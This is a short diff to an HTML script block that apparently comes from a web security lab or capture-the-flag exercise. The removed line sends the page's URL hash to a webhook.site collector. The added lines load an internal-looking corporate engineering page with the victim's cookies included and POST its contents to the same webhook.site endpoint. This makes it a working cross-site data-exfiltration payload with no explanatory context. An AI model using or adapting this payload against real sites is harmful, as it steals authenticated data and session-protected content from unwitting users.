@@ -1,3 +1,5 @@
 <script>
-fetch('https://webhook.site/4d7c58e8-cb47-4f18-b23e-9a75213bd336?hash=' + encodeURIComponent(location.hash))
+fetch('https://engineering.quoccacorp.com/', {credentials: 'include'})
+  .then(r => r.text())
+  .then(t => fetch('https://webhook.site/4d7c58e8-cb47-4f18-b23e-9a75213bd336', {method:'POST', body:t}))
 </script>
